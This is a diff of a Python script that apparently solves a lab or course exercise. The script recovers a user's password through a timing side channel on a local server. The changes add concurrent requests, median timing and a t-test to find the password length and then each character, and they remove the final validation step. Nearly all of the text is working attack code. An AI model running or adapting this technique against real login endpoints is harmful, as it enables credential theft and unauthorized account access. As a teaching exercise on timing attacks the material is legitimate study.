@@ -1,39 +1,54 @@
 import time
 import requests
-from statistics import mean
+from statistics import median
+from scipy.stats import ttest_ind
+from concurrent.futures import ThreadPoolExecutor
 
 # Configuration
 SERVER_URL = "http://127.0.0.1"
-USER_ID = "326647914"  # Replace with your ID
-DIFFICULTY = 1         # Adjust difficulty if needed
+USER_ID = "123456789"  # Replace with your ID/username
+DIFFICULTY = 1         # Adjust difficulty
 CHARACTERS = "abcdefghijklmnopqrstuvwxyz"
-RETRIES = 10            # Number of measurements for each character for greater accuracy
+RETRIES = 100         # Number of measurements per character (we take the median to mitigate outliers)
+WORKERS = 20           # Number of concurrent threads (if this number is too high the code goes crazy, i believe its too many request for the server at the same time)
+# keep workers low , WORKERS < (1/2 * RETRIES - 5) or so to keep the server from crashing
 
 
-def measure_time(user, password, difficulty):
+def measure_single_request(url):
     """
-    Measures the response time for a given password.
-    Returns the average time after several attempts.
+    Sends a single request to the server and measures its response time.
     """
-    url = f"{SERVER_URL}/?user={user}&password={password}&difficulty={difficulty}"
+    try:
+        start = time.time()
+        requests.get(url)
+        end = time.time()
+        return end - start
+    except requests.exceptions.RequestException:
+        return float("inf")  # Handle connection errors gracefully
+
+
+def measure_time_for_character(i_user, i_difficulty, candidate, retries, workers):
+    """
+    Measures the median response time for a single candidate password using multiple threads.
+    """
+    url = f"{SERVER_URL}/?user={i_user}&password={candidate}&difficulty={i_difficulty}"
+
+    # Use ThreadPoolExecutor to perform concurrent requests
     timings = []
+    with ThreadPoolExecutor(max_workers=workers) as executor:
+        futures = [executor.submit(measure_single_request, url) for _ in range(retries)]
+        for future in futures:
+            result = future.result()
+            if result != float("inf"):  # Ignore failed requests
+                timings.append(result)
 
-    for _ in range(RETRIES):
-        try:
-            start = time.time()
-            response = requests.get(url)
-            end = time.time()
-            timings.append(end - start)
-        except requests.exceptions.RequestException as e:
-            print(f"Connection error: {e}")
-            return float("inf"), ""
-    
-    return mean(timings), response.text.strip()
+    # Compute the median time
+    return median(timings) if timings else float("inf")
 
 
 def find_password_length(user, difficulty):
     """
-    Finds the length of the password using average response times.
+    Determines the password length based on response times.
     """
     print("Determining password length...")
     base_password = "a"
@@ -41,13 +56,13 @@ def find_password_length(user, difficulty):
     prev_time = 0
     for length in range(1, 33):  # Test lengths up to 32
         test_password = base_password * length
-        response_time, _ = measure_time(user, test_password, difficulty)
-        print(f"Length {length}, average time: {response_time:.5f}s")
+        med_time = measure_time_for_character(user, difficulty, test_password, RETRIES, WORKERS)
+        print(f"Length {length}, median time: {med_time:.5f}s")
 
-        if response_time > prev_time + 0.02:  # Adjust the threshold for difficulty
+        if med_time > prev_time + 0.02:  # Adjust the threshold for difficulty
             print(f"Estimated length: {length}")
             return length
-        prev_time = response_time
+        prev_time = med_time
 
     print("No length found.")
     return None
@@ -55,79 +70,70 @@ def find_password_length(user, difficulty):
 
 def find_password(user, difficulty, length):
     """
-    Finds the password by exploiting average response times.
+    Finds the password by exploiting response times.
     """
     print(f"Searching for password of length {length}...")
     password = ""
+    
 
     for position in range(length):
+        #intilize variables for the character that took the longest on average
         max_time = 0
         best_char = ""
-        base_times = []  # List to store response times for fast-path check
+        ttest_flag = False
+        
+        #intilize two groups for ttest
+        groupNotLikely = []
+        groupLikely = []
 
-        for i, char in enumerate(CHARACTERS):
-            candidate = password + char + "a" * (length - len(password) - 1)  # Create a candidate password and fill the rest with 'a' to match length
-            response_time, _ = measure_time(user, candidate, difficulty)  # Get an average response time for the candidate password
-            print(f"Testing '{candidate}': average time {response_time:.5f}s")
+        for char in CHARACTERS:
+            #create candidate password
+            candidate = password + char + "a" * (length - len(password) - 1)
+            print(f"Testing '{candidate}' at position {position}...")
 
-            # Store times for comparison
-            base_times.append((char, response_time))  # Store the character and the response time in a list
+            # Measure the response time for the candidate password
+            med_time = measure_time_for_character(user, difficulty, candidate, RETRIES, WORKERS)
+            print(f"Character '{char}' median time: {med_time:.5f}s")
 
-            if response_time > max_time:  # Track the character with the highest response time
-                max_time = response_time
+            #mark it if its the one that took the longest on average so far
+            if med_time > max_time:
+                max_time = med_time
                 best_char = char
-
-            # FOR EFFICIENCY ONLY:
-            # Fast path check: If this response time is significantly higher, select it
-            if len(base_times) > 1 and i >= 4:  # If character is not in the first four characters
-                avg_time = mean([time for _, time in base_times[:-1]])  # Exclude current time
-                if response_time > 1.3 * avg_time:  # 1.5x avg time for significant threshold
-                    print(f"Fast-path selection: '{char}' due to significant time increase.")
+            
+            # TTest check for significant difference of the character we're on compared to previous ones
+            if char <= 'e': # if the character is in the first e characters of the alphabet skip over ttest not enough data
+                groupNotLikely.append(med_time)
+            else:
+                groupLikely.append(med_time)
+                t_stat, p_value = ttest_ind(groupNotLikely, groupLikely)
+                print(f"p_value: {p_value:.5f}")
+                if p_value < 0.005:
+                    print(f"Found character by P_Value (ttest) {position}: '{char}' with median time {max_time:.5f}s")
                     password += char
+                    print(f"Partial password: {password}")
+                    ttest_flag = True
                     break
-        else:
-            # Add the best character after evaluating all candidates
-            password += best_char
+                else:
+                    groupLikely.pop()
+                    groupNotLikely.append(med_time)
 
+        #skip to the next position if we found the character by ttest              
+        if ttest_flag:
+            continue
+
+        #take the character that took the longest on average if no ttest significance was found
+        password += best_char
+        print(f"Best character at position {position}: '{best_char}' with median time {max_time:.5f}s")
         print(f"Partial password: {password}")
 
-    # Final verification of the password
-    _, response = measure_time(user, password, difficulty)
-    if response == "1":
-        print(f"Password found: {password}")
-        return password
-    else:
-        print("The found password is not valid. Correcting...")
-        return correct_password(user, difficulty, password)
-
-
-def correct_password(user, difficulty, initial_password):
-    """
-    Corrects the password character by character if validation fails.
-    """
-    print(f"Correcting the initial password: {initial_password}")
-    password = list(initial_password)
-
-    for position in range(len(password)):
-        for char in CHARACTERS:
-            candidate = ''.join(password[:position] + [char] + password[position + 1:])
-            _, response = measure_time(user, candidate, difficulty)
-            print(f"Testing correction '{candidate}'")
-
-            if response == "1":
-                print(f"Corrected password found: {candidate}")
-                return candidate
-
-    print("Unable to correct the password.")
-    return None
+    return password
 
 
 if __name__ == "__main__":
-    # Step 1: Find the exact password length
+    # Step 1: Find the password length
     estimated_length = find_password_length(USER_ID, DIFFICULTY)
 
     # Step 2: Find the password with the estimated length
     if estimated_length:
-        password = find_password(USER_ID, DIFFICULTY, estimated_length)
-        if password:
-            print(f"Final password: {password}")
+        final_password = find_password(USER_ID, DIFFICULTY, estimated_length)
+        print(f"Final password: {final_password}")
